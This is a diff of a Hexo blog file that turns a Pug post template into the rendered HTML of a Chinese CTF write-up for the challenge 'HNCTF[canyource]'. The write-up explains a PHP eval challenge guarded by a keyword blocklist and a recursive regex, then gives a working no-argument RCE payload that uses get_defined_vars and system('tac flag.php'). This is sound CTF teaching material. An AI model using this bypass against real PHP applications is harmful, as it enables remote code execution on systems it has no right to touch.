@@ -1,107 +1,47 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>HNCTF[canyource] | Boogiepop Don't Laugh</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Boogiepop Don't Laugh" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>HNCTF[canyource]</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-10-06T17:10:56.327Z" id="date"> 2022-10-07</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2022-10-06T17:28:47.398Z" id="updated"> 2022-10-07</time></div></span></div></div><hr><div id="post-content"><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/url|show|high|na|info|dec|oct|pi|log|data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-block content
-  -
-    const prev = page.prev
-    const next = page.next
-    const dateConf = theme.post.date
-    const updatedConf = theme.post.updated
-    const excerptConf = theme.post.excerpt
-    const reward = theme.post.reward
-    const encrypted = page.encrypt || page.password
-    const tocContent = encrypted === undefined ? toc(page.content, theme.toc) : toc(page.origin, theme.toc)
-    const countWord = theme.post.count === true && wordcount !== undefined ? wordcount(page.content) : null
-    const countTime = theme.post.time === true && min2read !== undefined ? min2read(page.content) : null
-  #post-bg
-    #post-title
-      h1= page.title
-      if (dateConf || updatedConf) && page.published
-        #post-info
-          - var first = true
-          if dateConf
-            span #{__('post.posted')}
-              div.control
-                time(datetime=page.date.toJSON())#date
-                  = ' ' + date(page.date, date_format)
-            - first = false
-          if updatedConf
-            if !first
-              br
-            span #{__('post.edited')}
-              div.control
-                time(datetime=page.updated.toJSON())#updated
-                  = ' ' + date(page.updated, date_format)
-            - first = false
-          if countWord
-            if !first
-              br
-            span #{__('post.countTotal')}
-              div.control #{countWord}
-            - first = false
-          if countTime
-            if !first
-              br
-            span #{__('post.timeTotal')}
-              div.control #{countTime} #{__('post.timeUnit')}
-    hr
-    #post-content
-      if excerptConf || encrypted
-        != page.content
-      else
-        != page.more
-      #paginator!= paginator()
-    #post-footer
-      if prev || next
-        - let fix = ""
-        if prev === undefined
-          - fix = "justify-content: flex-end"
-        if next === undefined
-          - fix = "justify-content: flex-start"
-        #pages(style=fix)
-          if prev !== undefined
-            .footer-link(style="width: 50%;text-align:right;border-right:1px #fe2 solid")
-              a(href=url_for(prev.path))
-                |← Next
-                = ' ' + prev.title
-          if next !== undefined
-            .footer-link(style="width: 50%;right:1px;border-left:1px #fe2 solid")
-              a(href=url_for(next.path))
-                = next.title + ' '
-                |Prev →
-    if reward
-      details#reward
-        summary #{__('post.reward')}
-        each imgSrc, pay in reward
-          div
-            span #{pay}
-            br
-            img(src=config.root + imgSrc)
-    -
-      let count = (theme.valine.enable === true) +
-                  (theme.gitalk.enable === true) +
-                  (theme.waline.enable === true)
-    if page.comments && count
-      #comments
-        if count > 0
-          .selector
-            if theme.valine.enable === true
-              button.valine-sel
-            if theme.gitalk.enable === true
-              button.gitalk-sel
-            if theme.waline.enable === true
-              button.waline-sel
-        if theme.valine.enable === true
-          #valine
-        if theme.gitalk.enable === true
-          #gitalk
-        if theme.waline.enable === true
-          #waline
 
-block aside-block
-  - 
-    const encrypted = page.encrypt || page.password
-    const tocContent = encrypted === undefined ? toc(page.content, theme.toc) : toc(page.origin, theme.toc)
-  if (tocContent.length > 0)
-    #toc-div(style=encrypted !== undefined?"display:none":"")
-      h1 #{__('post.index')}
-      |!{tocContent}
+
+<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>这一题关键的点就在一个正则匹配：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>[^\W]+</code>：\W表示匹配任何不包含a-zA-Z0-9和下划线的字符串，加了个^后表示匹配数字或者字母或者下划线，然后最后的<code>+</code>表示匹配任何至少包含一个前导字符串</p>
+</li>
+<li><p><code>\((?R)?\)</code>：这个才是今天的重头戏，这个表示递归，外边的括号不算递归的内容，递归的内容是<code>(?R)</code>，后面的问号表示递归多次，怎么理解<code>(?R)?</code>呢也就是表达再匹配一次这个正则表达式，举个栗子</p>
+<p><code>a(b(c()))</code>这一串字符串就会全部都被匹配，第一次匹配的是<code>a()</code>，然后再括号内再匹配一次这个正则表达式，进入第一次递归，就匹配到<code>a(b())</code>,然后同上匹配到<code>a(b(c()))</code>,有点儿绕哈哈，下面的文章有很详细的步骤</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/technofiend/article/details/49906755?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-49906755-blog-115988827.pc_relevant_vip_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-49906755-blog-115988827.pc_relevant_vip_default&amp;utm_relevant_index=2">https://blog.csdn.net/technofiend/article/details/49906755?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-49906755-blog-115988827.pc_relevant_vip_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-49906755-blog-115988827.pc_relevant_vip_default&amp;utm_relevant_index=2</a></p>
+</li>
+<li><p><code>preg_replace(a,b,c)</code>：也就是把c中匹配的a用b代替</p>
+<p>在本题表示，把匹配到的替换成空，假如最后的结果只剩下一个分号，就进入判断</p>
+</li>
+</ul>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>这里其实就是无数字rce，用一些带括号的函数来构造：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221007012553651.png" alt="image-20221007012553651"></p>
+<p>这样就好懂了吧，所以最后的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：?code=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">POST：1=system(&#x27;tac flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221007012735799.png" alt="image-20221007012735799"></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/10/07/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019%5DEasySQL/">← Next [极客大挑战 2019]EasySQL</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/10/07/HNCTF%5Bez_ssrf%5D/">HNCTF[ez_ssrf] Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Boogipop</a></h1><div id="description"><p>Are you still in pain?</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">解题</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
